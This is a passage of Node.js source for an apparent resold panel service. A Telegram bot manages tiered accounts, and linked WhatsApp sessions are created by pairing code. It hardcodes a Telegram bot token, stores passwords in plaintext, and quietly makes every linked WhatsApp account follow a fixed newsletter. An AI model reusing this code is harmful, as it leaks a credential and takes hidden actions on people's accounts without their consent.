console.clear();
const TelegramBot = require('ell-tg-bot-api');
const bot = new TelegramBot("8450485773:AAGpmoBJvby3AID_YOzqhkDCdbfz6jZg5Kc", { polling: true });
const express = require('express');
const cors = require('cors');
const fs = require('fs');
const { exec } = require('child_process');
const axios = require("axios");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
  makeCacheableSignalKeyStore,
  encodeNewsletterMessage,
  patchMessageBeforeSending,
  encodeWAMessage,
  encodeSignedDeviceIdentity,
  jidEncode,
  jidDecode,
  baileysLib
} = require("@whiskeysockets/baileys")
const pino = require('pino');
const { Boom } = require('@hapi/boom');
const chalk = require('chalk');
const fetch = require("node-fetch");
const path = require("path");

let sock = {};
const pairingCodes = new Map();
const sessions = new Map();
const app = express();
const PORT = process.env.PORT || process.env.SERVER_PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));
const multer = require('multer');
app.use('/uploads', express.static('uploads'));
const DATA_FILE = './assets/chat_data.json';
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const dir = file.fieldname === 'voice' ? 'uploads/voices' : 'uploads/images';
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    cb(null, dir);
  },
  filename: (req, file, cb) => {
    const uniqueName = Date.now() + '-' + Math.round(Math.random() * 1E9) + path.extname(file.originalname);
    cb(null, uniqueName);
  }
});
const upload = multer({ storage });

function readMessages() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      const data = fs.readFileSync(DATA_FILE, 'utf8');
      return JSON.parse(data);
    }
    return { messages: [], messageIdCounter: 1 };
  } catch (error) {
    return { messages: [], messageIdCounter: 1 };
  }
}

function writeMessages(data) {
  try {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error('Error writing messages:', error);
  }
}

function getNextId() {
  const data = readMessages();
  const nextId = data.messageIdCounter;
  data.messageIdCounter++;
  writeMessages(data);
  return nextId;
}

const usePairingCode = true;

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

const usersFile = path.join(__dirname, 'assets', 'users.json');
const ADMINS_FILE = path.join(__dirname, 'assets', 'admins.json');
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const SENDERSFILE = path.join(__dirname, 'assets', 'senders.json');

const DEVELOPER_IDS = [7277892050];

function loadAdmins() {
  try {
    if (!fs.existsSync(ADMINS_FILE)) {
      const defaultData = {
        owners: [],
        admins: [],
        resellers: []
      };
      fs.writeFileSync(ADMINS_FILE, JSON.stringify(defaultData, null, 2));
      return defaultData;
    }
    const data = fs.readFileSync(ADMINS_FILE, 'utf8');
    return JSON.parse(data);
  } catch (error) {
    console.error('Error reading admins file:', error);
    return { owners: [], admins: [], resellers: [] };
  }
}

function saveAdmins(data) {
  try {
    const dir = path.dirname(ADMINS_FILE);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(ADMINS_FILE, JSON.stringify(data, null, 2));
    return true;
  } catch (error) {
    console.error('Error saving admins file:', error);
    return false;
  }
}

function isDeveloper(userId) {
  return DEVELOPER_IDS.includes(Number(userId));
}

function isOwner(userId) {
  const data = loadAdmins();
  return data.owners.includes(Number(userId));
}

function isAdmin(userId) {
  const data = loadAdmins();
  return data.admins.includes(Number(userId));
}

function isReseller(userId) {
  const data = loadAdmins();
  return data.resellers.includes(Number(userId));
}

function hasAccess(userId) {
  return isDeveloper(userId) || isOwner(userId) || isAdmin(userId) || isReseller(userId);
}

function getUserStatus(userId) {
  if (isDeveloper(userId)) return "Developer";
  if (isOwner(userId)) return "Owner";
  if (isAdmin(userId)) return "Admin";
  if (isReseller(userId)) return "Reseller";
  return "No Access";
}

// Users database functions
function readUsers() {
  try {
    if (!fs.existsSync(usersFile)) return [];
    const data = fs.readFileSync(usersFile, 'utf8');
    return JSON.parse(data);
  } catch (error) {
    console.error('Error reading users file:', error);
    return [];
  }
}

function writeUsers(users) {
  try {
    const dir = path.dirname(usersFile);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(usersFile, JSON.stringify(users, null, 2));
    return true;
  } catch (error) {
    console.error('Error writing users file:', error);
    return false;
  }
}

function readSenders() {
  try {
    if (!fs.existsSync(SENDERSFILE)) return {};
    const data = fs.readFileSync(SENDERSFILE, 'utf8');
    return JSON.parse(data);
  } catch (error) {
    console.error('Error reading senders file:', error);
    return {};
  }
}

function writeSenders(senders) {
  try {
    const dir = path.dirname(SENDERSFILE);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(SENDERSFILE, JSON.stringify(senders, null, 2));
    return true;
  } catch (error) {
    return false;
  }
}

function getUserSenders(username) {
  const senders = readSenders();
  return senders[username] || [];
}

function addUserSender(username, botNumber) {
  const senders = readSenders();
  if (!senders[username]) {
    senders[username] = [];
  }
  
  if (!senders[username].includes(botNumber)) {
    senders[username].push(botNumber);
    const success = writeSenders(senders);
    return success;
  }
  return true;
}

function removeUserSender(username, botNumber) {
  const senders = readSenders();
  if (senders[username]) {
    senders[username] = senders[username].filter(num => num !== botNumber);
    const success = writeSenders(senders);
    return success;
  }
  return true;
}

function getAllSenders() {
  return readSenders();
}

function getAllUsers() {
  return readUsers();
}

if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true });
if (!fs.existsSync(SESSIONS_FILE)) fs.writeFileSync(SESSIONS_FILE, JSON.stringify([]));
if (!fs.existsSync(SENDERSFILE)) fs.writeFileSync(SENDERSFILE, JSON.stringify({}));
if (!fs.existsSync(path.dirname(ADMINS_FILE))) fs.mkdirSync(path.dirname(ADMINS_FILE), { recursive: true });

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) sessions.push(...existing, botNumber);
    } else sessions.push(botNumber);
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  try {
    let statusMessage = await bot.sendMessage(chatId, `\`\`\`\nconnect ${botNumber}.....\`\`\` `, { parse_mode: "Markdown" }).then((msg) => msg.message_id);
    const sessionDir = createSessionDir(botNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    
    const sock = makeWASocket({
      printQRInTerminal: !usePairingCode,
      syncFullHistory: true,
      markOnlineOnsockect: true,
      sockectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      keepAliveIntervalMs: 10000,
      generateHighQualityLinkPreview: true,
      patchMessageBeforeSending: (message) => {
        const requiresPatch = !!(message.buttonsMessage || message.templateMessage || message.listMessage);
        if (requiresPatch) {
          message = {
            viewOnceMessage: {
              message: {
                messageContextInfo: { deviceListMetadataVersion: 2, deviceListMetadata: {} },
                ...message
              }
            }
          };
        }
        return message;
      },
      version: (await (await fetch('https://raw.githubusercontent.com/WhiskeySockets/Baileys/master/src/Defaults/baileys-version.json')).json()).version,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      logger: pino({ level: 'fatal' }),
      auth: {
        creds: state.creds,
        keys: makeCacheableSignalKeyStore(state.keys, pino().child({ level: 'silent', stream: 'store' }))
      }
    });

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;
      if (connection === "close") {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        if (statusCode && statusCode >= 500 && statusCode < 600) {
          await bot.editMessageText(
            `\`\`\`\nconnecting sedan ${botNumber}.....\`\`\` `,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown"
            }
          );
          setTimeout(async () => {
            await connectToWhatsApp(botNumber, chatId);
          }, 5000);
        } else {
          await bot.editMessageText(
            `\`\`\`\nthere is an error ${botNumber}.....\`\`\` `,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown"
            }
          );
          try {
            fs.rmSync(sessionDir, { recursive: true, force: true });
          } catch (error) {
            console.error("Error deleting session:", error);
          }
        }
      } else if (connection === "open") {
        sessions.set(botNumber, sock);
        saveActiveSessions(botNumber);
        await bot.editMessageText(
          `\`\`\`\nsuccessfully connected ${botNumber}\`\`\` `,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown"
          }
        );
        sock.ev.on("connection.update", async (update) => {
          const { connection } = update;
          if (connection === "close") {
            setTimeout(async () => {
              await connectToWhatsApp(botNumber, chatId);
            }, 5000);
          }
        });
      } else if (connection === "connecting") {
        await new Promise((resolve) => setTimeout(resolve, 1000));
        try {
          if (!fs.existsSync(`${sessionDir}/creds.json`)) {
            const code = await sock.requestPairingCode(botNumber, "socksock");
            const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

            await bot.editMessageText(
              `\`\`\`\npairing code ${formattedCode}\`\`\``,
              {
                chat_id: chatId,
                message_id: statusMessage,
                parse_mode: "Markdown"
              }
            );
          }
        } catch (error) {
          console.error("Error requesting pairing code:", error);
          await bot.editMessageText(
            `\`\`\`${botNumber}.....\n${error.message}\`\`\``,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown"
            }
          );
        }
      }
    });    
    sock.ev.on("creds.update", saveCreds);
    return sock;
  } catch (error) {
    console.error("Error in connectToWhatsApp:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    const sender1 = readSenders();
    const sender2 = JSON.parse(fs.readFileSync(SESSIONS_FILE));
    const allBotNumbers = [...new Set(Object.values(sender1).flat()), ...sender2];    
    console.log(chalk.blue(`Found ${allBotNumbers.length} WhatsApp sessions in database`));
    
    const connectionPromises = allBotNumbers.map(async (botNumber) => {
      const sessionDir = createSessionDir(botNumber);
      if (!fs.existsSync(path.join(sessionDir, 'creds.json'))) {
        console.log(chalk.yellow(`Session file not found for ${botNumber}, skipping...`));
        return null;
      }
      
      const connectionTimeout = new Promise((_, reject) => {
        setTimeout(() => reject(new Error(`Connection timeout for ${botNumber}`)), 8000);
      });
      
      try {
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);        
        const sock = makeWASocket({
          printQRInTerminal: !usePairingCode,
          syncFullHistory: true,
          markOnlineOnConnect: true,
          connectTimeoutMs: 60000,
          defaultQueryTimeoutMs: 0,
          keepAliveIntervalMs: 10000,
          generateHighQualityLinkPreview: true,
          patchMessageBeforeSending: (message) => {
            const requiresPatch = !!(message.buttonsMessage || message.templateMessage || message.listMessage);
            if (requiresPatch) {
              message = {
                viewOnceMessage: {
                  message: {
                    messageContextInfo: { deviceListMetadataVersion: 2, deviceListMetadata: {} },
                    ...message
                  }
                }
              };
            }
            return message;
          },
          version: (await (await fetch('https://raw.githubusercontent.com/WhiskeySockets/Baileys/master/src/Defaults/baileys-version.json')).json()).version,
          browser: ["Ubuntu", "Chrome", "20.0.04"],
          logger: pino({ level: 'fatal' }),
          auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino().child({ level: 'silent', stream: 'store' }))
          }
        });
        
        const connectionPromise = new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(chalk.green(`Bot ${botNumber} terhubung!`));
              const res = await sock.newsletterMetadata("invite", "0029VbBPpiQ2v1J1zu7uzK36")
              await sock.newsletterFollow(res.id);
              sessions.set(botNumber, sock);
              resolve(sock);
            } else if (connection === "close") {
              const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
              if (!shouldReconnect) {
                Object.keys(sender1).forEach(username => {
                  if (sender1[username].includes(botNumber)) {
                    removeUserSender(username, botNumber);
                  }
                });
                reject(new Error(shouldReconnect, botNumber));
              }
            }
          });
          sock.ev.on("creds.update", saveCreds);
        });
        
        const result = await Promise.race([connectionPromise, connectionTimeout]);
        return { botNumber, sock: result };
        
      } catch (error) {
        console.log(chalk.red(`Failed to connect ${botNumber}: ${error.message}`));
        
        Object.keys(sender1).forEach(username => {
          if (sender1[username].includes(botNumber)) {
            removeUserSender(username, botNumber);
          }
        });
        
        if (sender2.includes(botNumber)) {
          const updatedSender2 = sender2.filter(num => num !== botNumber);
          fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedSender2, null, 2));
        }
        
        return null;
      }
    });
    
    const results = await Promise.allSettled(connectionPromises);
    const successfulConnections = results
      .filter(result => result.status === 'fulfilled' && result.value !== null)
      .map(result => result.value);
    
    console.log(chalk.green(`Successfully connected ${successfulConnections.length}/${allBotNumbers.length} sessions`));
    
  } catch (error) {
    console.error(chalk.red("Error initializing WhatsApp connections:"), error);
  }
}

async function connectToWhatsAppWeb(username, botNumber) {
  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const sock = makeWASocket({
    printQRInTerminal: !usePairingCode,
    syncFullHistory: true,
    markOnlineOnsockect: true,
    sockectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 0,
    keepAliveIntervalMs: 10000,
    generateHighQualityLinkPreview: true,
    patchMessageBeforeSending: (message) => {
      const requiresPatch = !!(message.buttonsMessage || message.templateMessage || message.listMessage);
      if (requiresPatch) {
        message = {
          viewOnceMessage: {
            message: {
              messageContextInfo: { deviceListMetadataVersion: 2, deviceListMetadata: {} },
              ...message
            }
          }
        }
      }
      return message;
    },
    version: (await (await fetch('https://raw.githubusercontent.com/WhiskeySockets/Baileys/master/src/Defaults/baileys-version.json')).json()).version,
    browser: ["Ubuntu", "Chrome", "20.0.04"],
    logger: pino({ level: 'fatal' }),
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, pino().child({ level: 'silent', stream: 'store' }))
    }
  });
  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
        removeUserSender(username, botNumber);
      if (statusCode && statusCode >= 500 && statusCode < 600) await connectToWhatsAppWeb(username, botNumber);
      else {
        try {
          sessions.delete(botNumber);
          pairingCodes.delete(botNumber);
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      pairingCodes.delete(botNumber);
      addUserSender(username, botNumber);
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber, "XXXXXXXX");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          pairingCodes.set(botNumber, code);
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        sessions.delete(botNumber);
        pairingCodes.delete(botNumber);
        removeUserSender(username, botNumber);
      }
    }
  });
  sock.ev.on("creds.update", saveCreds);
  return sock;
}


async function handleUserManagement(msg, input, type, action) {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (type === 'owner' && !isDeveloper(userId)) {
    return bot.sendMessage(chatId, "❌ Only developer can manage owners!");
  }
  
  if (type === 'admin' && !isOwner(userId) && !isDeveloper(userId)) {
    return bot.sendMessage(chatId, "❌ Only owner/developer can manage admins!");
  }
  
  if (type === 'reseller' && !isOwner(userId) && !isAdmin(userId) && !isDeveloper(userId)) {
    return bot.sendMessage(chatId, "❌ No permission to manage resellers!");
  }
  
  let targetUser;
  let fullName = '';
  
  if (msg.reply_to_message) {
    targetUser = msg.reply_to_message.from.id;
    fullName = [msg.reply_to_message.from.first_name, msg.reply_to_message.from.last_name].filter(Boolean).join(' ');
  } else if (input?.startsWith('@')) {
    try {
      const member = await bot.getChatMember(chatId, input);
      targetUser = member.user.id;
      fullName = [member.user.first_name, member.user.last_name].filter(Boolean).join(' ');
    } catch {
      return bot.sendMessage(chatId, "❌ Invalid username!");
    }
  } else if (input && !isNaN(input)) {
    targetUser = Number(input);
    try {
      const member = await bot.getChatMember(chatId, targetUser);
      fullName = [member.user.first_name, member.user.last_name].filter(Boolean).join(' ');
    } catch {
      fullName = targetUser.toString();
    }
  } else {
    return bot.sendMessage(chatId, "❌ Please reply to a user or provide user ID/username!");
  }
  
  if (!fullName) fullName = targetUser.toString();
  
  const data = loadAdmins();
  const key = type === 'owner' ? 'owners' : type === 'admin' ? 'admins' : 'resellers';
  
  data[key] = data[key].map(id => Number(id));
  
  const isAdd = action.toLowerCase() === 'add';
  const exists = data[key].includes(targetUser);
  
  if ((isAdd && exists) || (!isAdd && !exists)) {
    const actionText = isAdd ? 'already exists' : 'not found';
    return bot.sendMessage(chatId, `❌ User ${actionText} as ${type}!`);
  }
  
  if (isAdd) {
    data[key].push(targetUser);
  } else {
    data[key] = data[key].filter(id => id !== targetUser);
  }
  
  saveAdmins(data);
  
  const actionText = isAdd ? 'added' : 'removed';
  bot.sendMessage(chatId, 
    `✅ User [${fullName}](tg://user?id=${targetUser}) successfully ${actionText} as ${type.toUpperCase()}!`,
    { 
      parse_mode: 'Markdown',
      reply_to_message_id: msg.message_id 
    }
  );
}

bot.onText(/^\/(add|del)(owner|admin|reseller)\s*(.*)/i, async (msg, match) => {
  const action = match[1];
  const type = match[2];
  const input = match[3];
  await handleUserManagement(msg, input, type, action);
});

bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const userStatus = getUserStatus(userId);
  const fullName = `${msg.from.first_name || ''} ${msg.from.last_name || ''}`.trim();
  const username = msg.from.username || fullName;
  
  let menuText = `<blockquote><b>
━━━━━━━━━━━━━━━━━━━━━━━━━
▢ USER : @${username}
▢ ID : <code>${userId}</code>
▢ STATUS : ${userStatus}
━━━━━━━━━━━━━━━━━━━━━━━━━`;
  
  if (isDeveloper(userId) || isOwner(userId)) {
    menuText += `
~ ▢ /adduser [username],[expired]
~ ▢ /listuser
~ ▢ /reqpair [number]`;
  }
  
  if (isAdmin(userId)) {
    menuText += `
~ ▢ /adduser [username],[expired]
~ ▢ /listuser`;
  }
  
  if (isReseller(userId)) {
    menuText += `
~ ▢ /adduser [username],[expired]`;
  }
  
  if (isDeveloper(userId)) {
    menuText += `
~ ▢ /addowner [reply/user]
~ ▢ /delowner [reply/user]`;
  }
  
  if (isOwner(userId) || isDeveloper(userId)) {
    menuText += `
~ ▢ /addadmin [reply/user]
~ ▢ /deladmin [reply/user]`;
  }
  
  if (isAdmin(userId) || isOwner(userId) || isDeveloper(userId)) {
    menuText += `
~ ▢ /addreseller [reply/user]
~ ▢ /delreseller [reply/user]`;
  }
  if (userStatus === "No Access") {
    menuText += `
~ ▢ /createacc untuk membuat akun free`;
  }
  menuText += `
━━━━━━━━━━━━━━━━━━━━━━━━━</b></blockquote>`;
  
  const opts = {
    caption: menuText,
    reply_to_message_id: msg.message_id,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: 'Developer', url: `https://t.me/YuuMD` }]]
    }
  };
  
  await bot.sendAnimation(chatId, 'https://files.catbox.moe/xhjb2x.mp4', opts);
});
bot.onText(/^\/up/, async (msg) => {
    bot.sendMessage("@YuuMD", "n", { reply_markup: {
      inline_keyboard: [[{ text: 'BOT OBFUCATOR', url: `https://t.me/theobfucatorbot` }]]
    }
  });
})
bot.onText(/\/adduser (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const userStatus = getUserStatus(userId);
  const input = match[1].split(",");
  if (!hasAccess(userId)) {
    return bot.sendMessage(chatId, "❌ You don't have permission to use this command!");
  }
  if (msg.chat.type !== 'private') return;
  if (input.length < 2) {
    return bot.sendMessage(chatId, "Format: /adduser username,expiry\nExample: /adduser john,30", { parse_mode: "Markdown" });
  }
  
  const [username, expiry] = input.map(item => item.trim());
  const password = username + Math.floor(Math.random() * 1000);
  const users = readUsers();
  const expiryDays = parseInt(expiry);
  
  if (isNaN(expiryDays)) {
    return bot.sendMessage(chatId, "❌ Expiry must be a number!");
  }
  
  if (users.find(u => u.username === username)) {
    return bot.sendMessage(chatId, "❌ Username already registered!");
  }
  
  let inlineKeyboard = { inline_keyboard: [] };
  const userRole = getUserStatus(userId);
  
  if (isDeveloper(userId)) {
    inlineKeyboard.inline_keyboard = [
      [{ text: 'User', callback_data: `adduser_${username}_user_${expiry}_${password}` }],
      [{ text: 'Reseller', callback_data: `adduser_${username}_reseller_${expiry}_${password}` }],
      [{ text: 'Admin', callback_data: `adduser_${username}_admin_${expiry}_${password}` }],
      [{ text: 'Owner', callback_data: `adduser_${username}_owner_${expiry}_${password}` }]
    ];
  }
  else if (isOwner(userId)) {
    inlineKeyboard.inline_keyboard = [
      [{ text: 'User', callback_data: `adduser_${username}_user_${expiry}_${password}` }],
      [{ text: 'Reseller', callback_data: `adduser_${username}_reseller_${expiry}_${password}` }],
      [{ text: 'Admin', callback_data: `adduser_${username}_admin_${expiry}_${password}` }]
    ];
  }
  else if (isAdmin(userId)) {
    inlineKeyboard.inline_keyboard = [
      [{ text: 'User', callback_data: `adduser_${username}_user_${expiry}_${password}` }],
      [{ text: 'Reseller', callback_data: `adduser_${username}_reseller_${expiry}_${password}` }]
    ];
  }
  else if (isReseller(userId)) {
    inlineKeyboard.inline_keyboard = [
      [{ text: 'User', callback_data: `adduser_${username}_user_${expiry}_${password}` }]
    ];
  }
  else {
    const expiryDate = new Date();
    expiryDate.setDate(expiryDate.getDate() + expiryDays);
    
    users.push({
      username,
      password,
      role: 'user',
      status: "Active",
      expired: expiryDate.toISOString().split('T')[0],
      createdBy: userId,
      created: new Date().toISOString()
    });
    
    if (writeUsers(users)) {
      return bot.sendMessage(chatId, 
        `✅ User *${username}* successfully added!\n\n` +
        `Password: \`${password}\`\n` +
        `Role: user\n` +
        `Expired: ${expiryDate.toISOString().split('T')[0]}`,
        { parse_mode: "Markdown" }
      );
    }
  }
 
  if (inlineKeyboard.inline_keyboard.length > 0) {
    return bot.sendMessage(
      chatId,
      `Select role for user *${username}*:\nExpiry: ${expiryDays} days\nPassword will be auto-generated.`,
      { parse_mode: "Markdown", reply_markup: inlineKeyboard }
    );
  }
});

bot.on("callback_query", async (query) => {
  const chatId = query.message.chat.id;
  const data = query.data;
  const userId = query.from.id;
  
  if (data.startsWith("adduser_")) {
    const parts = data.replace("adduser_", "").split("_");
    if (parts.length < 4) return;
    
    const [username, role, expiry, password] = parts;
    
    if (role === 'owner' && !isDeveloper(userId)) {
      return bot.answerCallbackQuery(query.id, { text: "Only developer can create owner!" });
    }
    
    if (role === 'admin' && !isOwner(userId) && !isDeveloper(userId)) {
      return bot.answerCallbackQuery(query.id, { text: "Only owner/developer can create admins!" });
    }
    
    if (role === 'reseller' && !isAdmin(userId) && !isOwner(userId) && !isDeveloper(userId)) {
      return bot.answerCallbackQuery(query.id, { text: "No permission to create resellers!" });
    }
    
    if (role === 'user' && !hasAccess(userId)) {
      return bot.answerCallbackQuery(query.id, { text: "No permission to create users!" });
    }
    
    const users = readUsers();
    const expiryDays = parseInt(expiry);
    const expiryDate = new Date();
    expiryDate.setDate(expiryDate.getDate() + expiryDays);
    
    if (users.find(u => u.username === username)) {
      return bot.answerCallbackQuery(query.id, { text: "Username already exists!" });
    }
    
    users.push({
      username,
      password,
      role: role,
      status: "Active",
      expired: expiryDate.toISOString().split('T')[0],
      createdBy: userId,
      created: new Date().toISOString()
    });
    
    if (writeUsers(users)) {
      bot.editMessageText(
        `✅ User *${username}* successfully added!\n\n` +
        `Password: \`${password}\`\n` +
        `Role: ${role}\n` +
        `Expired: ${expiryDate.toISOString().split('T')[0]}`,
        {
          chat_id: chatId,
          message_id: query.message.message_id,
          parse_mode: "Markdown"
        }
      );
      bot.answerCallbackQuery(query.id, { text: `User ${username} created as ${role}!` });
      bot.sendMessage(DEVELOPER_IDS[0],
        `📋 New account created via Telegram Bot\n\n` +
        `👤 User: @${query.from.username || 'N/A'} (${userId})\n` +
        `📱 Panel Username: ${username} (${role})\n` +
        `📅 Expiry: ${expiryDays} days\n` +
        `🕐 Created: ${new Date().toLocaleString()}`
      );
    }
  }
  
  if (data.startsWith("view_")) {
    const username = data.replace("view_", "");
    const users = readUsers();
    const user = users.find(u => u.username === username);
    
    if (!user) {
      return bot.answerCallbackQuery(query.id, { text: "User not found!" });
    }
    
    const viewerRole = getUserStatus(userId);
    const targetRole = user.role;
    if (viewerRole === 'No Access') {
      return bot.answerCallbackQuery(query.id, { text: "No permission to view this user!" });
    }
    if (viewerRole === 'reseller' && targetRole !== 'user') {
      return bot.answerCallbackQuery(query.id, { text: "No permission to view this user!" });
    }
    
    if (viewerRole === 'admin' && (targetRole === 'admin' || targetRole === 'owner')) {
      return bot.answerCallbackQuery(query.id, { text: "No permission to view this user!" });
    }
    
    if (viewerRole === 'owner' && targetRole === 'owner') {
      return bot.answerCallbackQuery(query.id, { text: "No permission to view this user!" });
    }
    
    const maskedPassword = "*".repeat(user.password.length);
    
    let buttons = [];
    const canDelete = checkDeletePermission(userId, user);
    if (canDelete) {
      buttons.push([{ text: "🗑 Delete User", callback_data: `delete_${user.username}` }]);
    }
    
    buttons.push([{ text: "🔙 Back", callback_data: "back_list" }]);
    
    bot.editMessageText(
      `👤 *User Details*\n\n` +
      `• Username: *${user.username}*\n` +
      `• Password: \`${maskedPassword}\`\n` +
      `• Role: *${user.role}*\n` +
      `• Status: *${user.status}*\n` +
      `• Expired: *${user.expired}*\n` +
      `• Created: *${user.created ? new Date(user.created).toLocaleDateString() : 'N/A'}*`,
      {
        chat_id: chatId,
        message_id: query.message.message_id,
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard: buttons }
      }
    );
  }

  if (data.startsWith("delete_")) {
    const username = data.replace("delete_", "");
    const userId = query.from.id;
    
    const users = readUsers();
    const userToDelete = users.find(u => u.username === username);
    
    if (!userToDelete) {
      return bot.answerCallbackQuery(query.id, { text: "User not found!" });
    }
    const canDelete = checkDeletePermission(userId, userToDelete);
    if (!canDelete) {
      return bot.answerCallbackQuery(query.id, { text: "No permission to delete this user!" });
    }
    const updatedUsers = users.filter(u => u.username !== username);
    if (writeUsers(updatedUsers)) {
      bot.answerCallbackQuery(query.id, { text: `User ${username} deleted!` });
    }
    
    const filteredUsers = updatedUsers.filter(u => {
      const viewerRole = getUserStatus(userId);
      const targetRole = u.role;
      if (viewerRole === 'reseller' && targetRole !== 'user') return false;
      if (viewerRole === 'admin' && (targetRole === 'admin' || targetRole === 'owner')) return false;
      if (viewerRole === 'owner' && targetRole === 'owner') return false;      
      return true;
    });
    
    const buttons = filteredUsers.map(u => [
      { text: `${u.username} (${u.role})`, callback_data: `view_${u.username}` }
    ]);    
    let messageText = "📭 No registered users.";
    if (filteredUsers.length > 0) {
      messageText = `📂 *User List:* (${filteredUsers.length} users)`;
    }    
    bot.editMessageText(messageText, {
      chat_id: chatId,
      message_id: query.message.message_id,
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: buttons }
    });
  }
  if (data === "back_list") {
    const userId = query.from.id;
    const users = readUsers();
    const filteredUsers = users.filter(u => {
      const viewerRole = getUserStatus(userId);
      const targetRole = u.role;
      if (viewerRole === 'reseller' && targetRole !== 'user') return false;
      if (viewerRole === 'admin' && (targetRole === 'admin' || targetRole === 'owner')) return false;
      if (viewerRole === 'owner' && targetRole === 'owner') return false;      
      return true;
    });    
    const buttons = filteredUsers.map(u => [
      { text: `${u.username} (${u.role})`, callback_data: `view_${u.username}` }
    ]);  
    let messageText = "📭 No registered users.";
    if (filteredUsers.length > 0) {
      messageText = `📂 *User List:* (${filteredUsers.length} users)`;
    }    
    bot.editMessageText(messageText, {
      chat_id: chatId,
      message_id: query.message.message_id,
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: buttons }
    });
  }
});
function checkDeletePermission(deleterId, targetUser) {
  if (!hasAccess(deleterId)) return false;  
  const deleterRole = getUserStatus(deleterId);
  const targetRole = targetUser.role;
  if (isDeveloper(deleterId)) return true;
  if (isOwner(deleterId)) {
    if (targetRole === 'owner' || targetRole === 'developer') return false;
    return true;
  }
  if (isAdmin(deleterId)) {
